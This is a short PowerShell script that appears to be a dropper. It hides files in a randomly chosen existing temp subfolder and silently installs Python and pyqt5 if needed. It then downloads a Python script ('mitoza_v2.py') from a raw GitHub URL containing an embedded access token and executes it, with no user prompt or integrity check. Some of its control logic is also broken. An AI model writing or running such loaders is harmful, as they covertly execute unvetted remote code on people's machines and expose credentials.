$pth=(Get-ChildItem -Path $env:tmp -Directory -Name)
$irec=($pth[(Get-Random -Minimum 0 -Maximum ($pth | Measure-Object -Line).Lines)])
$direc = "$env:tmp\$irec"
try {
    python
}
catch {
    Invoke-WebRequest https://www.python.org/ftp/python/3.12.8/python-3.12.8-amd64.exe -OutFile "$direc\python-3.12.8-amd64.exe"
    Start-Process "$direc\python-3.12.8-amd64.exe" /quiet
    $a=1
    while ($a==1) {
        try {
            Start-Sleep -Seconds 2
            python -m pip install pyqt5
        }
        finally {
            $a=0 
        }
    }
}

Invoke-WebRequest https://raw.githubusercontent.com/Ksawix0/mitoza/refs/heads/main/mitoza_v2.py?token=GHSAT0AAAAAAC46SNMPZUYQ3LNM4MDZHJAUZ5CPWKA -outfile "$direc\mitoza.py"
python "$direc\mitoza.py"